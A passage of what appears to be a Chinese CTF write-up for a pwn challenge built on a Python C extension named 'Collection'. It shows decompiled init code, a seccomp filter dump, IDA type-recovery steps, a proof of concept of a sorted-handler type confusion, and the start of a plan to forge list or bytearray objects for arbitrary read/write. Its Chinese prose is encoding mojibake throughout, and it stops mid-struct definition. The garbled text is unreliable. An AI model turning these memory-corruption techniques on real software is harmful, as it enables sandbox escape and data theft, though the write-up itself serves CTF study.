class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">int64 <span class="title">PyInit_Collection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)PyType_Ready(&amp;qword_2041E0) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v0 = PyModule_Create2(&amp;unk_204120, <span class="number">1013L</span>L);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++qword_2041E0;</span><br><span class="line">    PyModule_AddObject(v0, <span class="string">&quot;Collection&quot;</span>, &amp;qword_2041E0);</span><br><span class="line">    mprotect((<span class="keyword">void</span> *)<span class="number">0x439000</span>, <span class="number">1u</span>LL, <span class="number">7</span>);</span><br><span class="line">    MEMORY[<span class="number">0x43968F</span>] = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_27E0);</span><br><span class="line">    MEMORY[<span class="number">0x43969F</span>] = MEMORY[<span class="number">0x43968F</span>];</span><br><span class="line">    mprotect((<span class="keyword">void</span> *)<span class="number">0x439000</span>, <span class="number">1u</span>LL, <span class="number">5</span>);</span><br><span class="line">    init_sandbox();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°å…¶åœ¨ seccomp å‡½æ•°ä¸­åšäº†ä¸€äº› seccompï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF  K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="keyword">if</span> (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  <span class="keyword">if</span> (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000000c  <span class="keyword">if</span> (A != brk) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000009  <span class="keyword">if</span> (A != mmap) goto 0012</span><br><span class="line"> 0011: 0x05 0x00 0x00 0x00000011  goto 0029</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x0000000b  <span class="keyword">if</span> (A != munmap) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000019  <span class="keyword">if</span> (A != mremap) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000013  <span class="keyword">if</span> (A != readv) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x000000ca  <span class="keyword">if</span> (A != futex) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x00000083  <span class="keyword">if</span> (A != sigaltstack) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  <span class="keyword">if</span> (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0024: 0x15 0x00 0x01 0x00000001  <span class="keyword">if</span> (A != write) goto 0026</span><br><span class="line"> 0025: 0x05 0x00 0x00 0x00000037  goto 0081</span><br><span class="line"> 0026: 0x15 0x00 0x01 0x0000000d  <span class="keyword">if</span> (A != rt_sigaction) goto 0028</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0028: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0029: 0x05 0x00 0x00 0x00000000  goto 0030</span><br><span class="line"> 0030: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0032: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0034: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0038</span><br><span class="line"> 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0036: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == 0x0) goto 0039</span><br><span class="line"> 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0038: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0040: 0x20 0x00 0x00 0x00000020  A = args[2]</span><br><span class="line"> 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0042: 0x20 0x00 0x00 0x00000024  A = args[2] &gt;&gt; 32</span><br><span class="line"> 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0044: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0048</span><br><span class="line"> 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0046: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == 0x3) goto 0049</span><br><span class="line"> 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0048: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0050: 0x20 0x00 0x00 0x00000028  A = args[3]</span><br><span class="line"> 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] &gt;&gt; 32</span><br><span class="line"> 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0054: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0058</span><br><span class="line"> 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0056: 0x15 0x02 0x00 0x00000022  <span class="keyword">if</span> (A == 0x22) goto 0059</span><br><span class="line"> 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0058: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0060: 0x20 0x00 0x00 0x00000030  A = args[4]</span><br><span class="line"> 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0062: 0x20 0x00 0x00 0x00000034  A = args[4] &gt;&gt; 32</span><br><span class="line"> 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0064: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0068</span><br><span class="line"> 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0066: 0x15 0x02 0x00 0xffffffff  <span class="keyword">if</span> (A == 0xffffffff) goto 0069</span><br><span class="line"> 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0068: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0070: 0x20 0x00 0x00 0x00000038  A = args[5]</span><br><span class="line"> 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] &gt;&gt; 32</span><br><span class="line"> 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0074: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0078</span><br><span class="line"> 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0076: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == 0x0) goto 0079</span><br><span class="line"> 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0078: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0080: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0081: 0x05 0x00 0x00 0x00000000  goto 0082</span><br><span class="line"> 0082: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0084: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0086: 0x15 0x00 0x05 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0092</span><br><span class="line"> 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0088: 0x15 0x00 0x02 0x00000001  <span class="keyword">if</span> (A != 0x1) goto 0091</span><br><span class="line"> 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0090: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0091: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0092: 0x15 0x00 0x05 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0098</span><br><span class="line"> 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0094: 0x15 0x00 0x02 0x00000002  <span class="keyword">if</span> (A != 0x2) goto 0097</span><br><span class="line"> 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0096: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0098: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>ä»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¤§èƒ†çš„çŒœæµ‹ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªä»»æ„è¯»ï¼Œé€šè¿‡ readv è¯»å–flag ç„¶åå°†å…¶æ‰“å°å‡ºæ¥ã€‚</p><p>å¦å¤–ä¸€ç‚¹ï¼Œç”±äºç¼–è¯‘åçš„Pythonç»“æ„ä½“ä¸å…¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªæ–¹æ³•ï¼š</p><p>ï¼ˆè¿™ä¸ªæ–¹æ³•æ˜¯ä¸è€æ•™æˆ‘çš„ï¼‰</p><p>è¿™ä¸ªæ–¹æ³•ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºæ­£å¸¸çš„debugç¼–è¯‘æ¥è¯´æ˜¯æ²¡æœ‰ç±»å‹ä¿¡æ¯çš„ï¼Œéœ€è¦ä½¿ç”¨<code>-g3</code>çš„debugç¼–è¯‘ç­‰çº§ï¼Œéœ€è¦åœ¨ç¼–è¯‘pythonçš„æ—¶å€™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure CFLAGS&#x3D;-g3</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç¼–è¯‘å‡ºå¸¦æœ‰typeçš„pythonï¼Œç„¶åç”¨idaæ‰“å¼€ï¼Œé€‰æ‹©<code>file -&gt; produce file -&gt; create C header</code>å°±å¯ä»¥å¯¼å‡ºåˆ°headerï¼Œåœ¨é€†å‘soåº“çš„è¿™è¾¹æŠŠheaderå¯¼å…¥å°±å¯ä»¥å¾—åˆ°ç±»å‹ä¿¡æ¯äº†ã€‚</p><p>åœ¨æ¢å¤å®Œç±»å‹ä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹çœ‹soåº“é‡Œå®šä¹‰çš„ä¸€äº›å…³é”®çš„æ¥å£äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionTypeMethod; tp_methods</span><br><span class="line">...</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionInit; tp_init</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq <span class="number">0</span>                    ; tp_alloc</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionNew ; tp_new</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦æ³¨æ„çš„å‡½æ•°æ˜¯newå’Œinitå‡½æ•°ï¼Œå› ä¸ºå®ƒä»¬æ˜¯åœ¨åˆå§‹åŒ–æ–°çš„Collectionå¯¹è±¡æ—¶è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‡½æ•°ã€‚æ€»ä¹‹ï¼Œtp_newæ£€æŸ¥æ˜¯å¦ä½¿ç”¨å­—å…¸åˆå§‹åŒ–äº†å¯¹è±¡ï¼Œå¹¶ç¡®ä¿å­—å…¸åªæœ‰32ä¸ªæˆ–æ›´å°‘çš„æˆå‘˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line">a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>], <span class="string">&quot;c&quot;</span>:&#123;<span class="string">&quot;a&quot;</span>:<span class="number">45545</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line">print(a.get(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">print(a.get(<span class="string">&quot;b&quot;</span>))</span><br><span class="line">print(a.get(<span class="string">&quot;c&quot;</span>))</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹é¢˜ç›®çš„åŸºæœ¬é€»è¾‘ï¼š</p><ol><li>serverä¸­ï¼šè®¾ç½®pyæ²™ç®±ï¼Œæ‰“å¼€flagï¼Œè®¾ç½®fdä¸º1023ç„¶åå¯åŠ¨ç”¨æˆ·çš„pythonç¨‹åºã€‚è®¾ç½®æ²™ç®±ï¼šè¿™ä¸€æ­¥å¯¼è‡´æˆ‘ä»¬æ ¹æœ¬ä¸ç”¨è€ƒè™‘å»ç»•è¿‡pythonå±‚çš„æ²™ç®±äº†ï¼Œå› ä¸ºåœ¨<code>import Collection</code>çš„æ—¶å€™æœ‰<code>init_sandbox</code>æ“ä½œï¼ŒåŠ å…¥äº†seccompï¼Œåªèƒ½ä½¿ç”¨ç™½åå•ï¼Œæˆ‘ä¸»è¦åœ¨æ„äº†ç™½åå•é‡Œæœ‰<code>write</code>å’Œ<code>readv</code>ï¼Œä½†æ˜¯æ²¡æœ‰openã€‚</li><li>æœ‰<code>Collection.Collection</code>å¯¹è±¡ï¼Œå’Œè¯¥å¯¹è±¡ä¸Šçš„<code>.get</code>æ–¹æ³•ã€‚å¯¹è±¡åˆå§‹åŒ–æ¥å—ä¸€ä¸ªdictï¼Œdictçš„keyå¿…é¡»ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åvalueä¸ºæ•°å€¼/list/dictä¸­çš„ä¸€ç§ã€‚<code>.get</code>æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åè¿”å›åˆå§‹åŒ–æ—¶ä¼ å…¥çš„å†…å®¹ã€‚</li><li>åœ¨åˆå§‹åŒ–æ—¶ä¼šå»ºç«‹ä¸€ä¸ª<code>handler</code>ï¼Œç›¸å½“äºkeyçš„ç¼“å­˜ï¼Œä¼šä¿å­˜ä¸‹ä¼ å…¥çš„dictçš„keyçš„å†…å®¹ï¼ˆå­—ç¬¦ä¸²å†…å®¹ï¼‰å’Œç±»å‹ï¼ˆæ˜¯æ•´æ•°è¿˜æ˜¯åˆ—è¡¨è¿˜æ˜¯å­—å…¸ï¼‰ï¼Œå»ºç«‹ä¹‹åä¼šå­˜å…¥ç¼“å­˜çš„handleré‡Œï¼Œå¦‚æœå­˜åœ¨â€œä¸€æ ·â€çš„handlerï¼Œå°±ä¼šç›´æ¥ä½¿ç”¨è¯¥handlerï¼Œè€Œä¸æ–°å»ºã€‚</li><li>handlerçš„â€œä¸€æ ·â€çš„æ¯”è¾ƒï¼Œæ˜¯å°†ä¸¤ä¸ªhandleræŒ‰ç…§å­—å…¸åºæ’åºï¼Œä¹‹åæ¯”è¾ƒä¸¤ä¸ªhandlerç›¸åº”ä½ç½®çš„keyå’Œç±»å‹æ˜¯ä¸æ˜¯éƒ½ä¸€æ ·ï¼Œå¦‚æœå®Œå…¨ä¸€æ ·åˆ™ä¸€æ ·ï¼Œå¦åˆ™åˆ™ä¸åŒ</li><li>åœ¨<code>.get</code>çš„æ—¶å€™ï¼Œé¦–å…ˆä»<code>handler</code>é‡Œæ‰¾åˆ°å¯¹åº”keyæ‰€åœ¨çš„ç´¢å¼•ï¼Œç„¶åä»å¯¹è±¡é‡Œçš„<code>slots</code>é‡Œå–å‡ºå†…å®¹è¿”å›ï¼Œå¦‚æœæ˜¯æ•´æ•°ï¼Œè¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡è½¬æ¢ï¼Œå°†æ•´æ•°è½¬æ¢ä¸ºpythonçš„æ•´æ•°å¯¹è±¡ç±»å‹ã€‚</li></ol><h2 id="Vul"><a href="#Vul" class="headerlink" title="Vul"></a>Vul</h2><p>çœ‹ä¸€ä¸ª PoC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@linuxkit<span class="number">-025000000001</span> /pwn<span class="comment"># cat test.py</span></span><br><span class="line"><span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = Collection.Collection(&#123;&quot;a&quot;:1337, &quot;b&quot;:[1.2], &quot;c&quot;:&#123;&quot;a&quot;:45545&#125;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(a.get(&quot;a&quot;))</span></span><br><span class="line"><span class="comment"># print(a.get(&quot;b&quot;))</span></span><br><span class="line"><span class="comment"># print(a.get(&quot;c&quot;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = Collection.Collection(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line">b = Collection.Collection(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(a.get(<span class="string">&quot;a&quot;</span>)) <span class="comment"># 1</span></span><br><span class="line">print(a.get(<span class="string">&quot;b&quot;</span>)) <span class="comment"># 2</span></span><br><span class="line">print(a.get(<span class="string">&quot;c&quot;</span>)) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">print(b.get(<span class="string">&#x27;a&#x27;</span>)) <span class="comment"># 1 â† should be 2</span></span><br><span class="line">print(b.get(<span class="string">&#x27;b&#x27;</span>)) <span class="comment"># 2 â† should be 1</span></span><br><span class="line">print(b.get(<span class="string">&#x27;c&#x27;</span>)) <span class="comment"># 3â                                                                                                     root@linuxkit-025000000001 /pwn# python3 test.py</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p>åŸæœ¬ a è¢«å®šä¹‰ä¸ºï¼š{â€˜aâ€™: 1, â€˜bâ€™: 2, â€˜câ€™: 3}</p><pre><code>   b è¢«å®šä¹‰ä¸ºï¼š&#123;&#39;b&#39;: 1, &#39;a&#39;: 2, &#39;c&#39;: 3&#125;</code></pre><p>é‚£ä¹ˆæœ¬åº”è¯¥ b.get(â€˜aâ€™)è·å–çš„åº”è¯¥æ˜¯2 ä½†æ˜¯åœ¨è¿™ä¸ªæ—¶å€™ç¼ºæ‹¿åˆ°æ˜¯ 1 è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p>ä¸åŒå¯¹è±¡çš„ä¸¤ä¸ªhandleræ˜¯ç»è¿‡æ’åºçš„ï¼Œæ’åºä¹‹åè®¤ä¸ºç›¸åŒï¼Œåˆ™å°±ä½¿ç”¨ç°æœ‰çš„handleräº†ï¼Œä½†æ˜¯äº‹å®ä¸Šä¸¤ä¸ªhandlerç›¸åŒä¹‹åï¼Œä»–ä»¬çš„é¡ºåºå¯èƒ½æ˜¯ä¸åŒçš„ï¼Œè€Œååœ¨<code>.get</code>çš„æ—¶å€™åˆç”¨åˆ°äº†è¿™ä¸ªé¡ºåºï¼Œä¸åŒçš„é¡ºåºå¯¹åº”çš„ç´¢å¼•è‚¯å®šä¸åŒã€‚</p><p>è¿™æ ·å°±é€ æˆäº†ä¸€ä¸ªç±»ä¼¼äºç±»å‹æ··æ·†çš„ç‚¹</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>æˆ‘ä»¬å°è¯•ç”¨<code>get()</code>è¿”å›ä¸€ä¸ªæˆ‘åœ¨å†…å­˜ä¸­åˆ›å»ºçš„ä¼ªé€ çš„Pythonåˆ—è¡¨å¯¹è±¡ã€‚æˆ‘å¸Œæœ›è¿™ä¼šè®©æˆ‘é€šè¿‡Listçš„å†…å®¹ä»»æ„å†™.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="comment">/* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */</span></span><br><span class="line">    PyObject **ob_item;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ob_item contains space for &#x27;allocated&#x27; elements.  The number</span></span><br><span class="line"><span class="comment">     * currently in use is ob_size.</span></span><br><span class="line"><span class="comment">     * Invariants:</span></span><br><span class="line"><span class="comment">     *     0 &lt;= ob_size &lt;= allocated</span></span><br><span class="line"><span class="comment">     *     len(list) == ob_size</span></span><br><span class="line"><span class="comment">     *     ob_item == NULL implies ob_size == allocated == 0</span></span><br><span class="line"><span class="comment">     * list.sort() temporarily sets allocated to -1 to detect mutations.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Items must normally not be NULL, except during construction when</span></span><br><span class="line"><span class="comment">     * the list is not yet visible outside the function that builds it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">&#125; PyListObject;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸è€æ„è¯†åˆ°ï¼Œç”¨liståšä»»æ„è¯»å†™å¹¶ä¸ç°å®ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªèƒ½å¤Ÿç›´æ¥å†™å…¥å€¼è€Œéå¯¹è±¡çš„ç±»å‹ã€‚ä¹‹å‰éƒ½æƒ³åˆ°bytesäº†ï¼Œç°åœ¨éœ€è¦ä»–å¯ä»¥æ›´æ”¹ï¼Œé‚£å°±bytearrayã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    Py_ssize_t ob_alloc; <span class="comment">/* How many bytes allocated in ob_bytes */</span></span><br><span class="line">    <span class="keyword">char</span> *ob_bytes;      <span class="comment">/* Physical backing buffer */</span></span><br><span class="line">    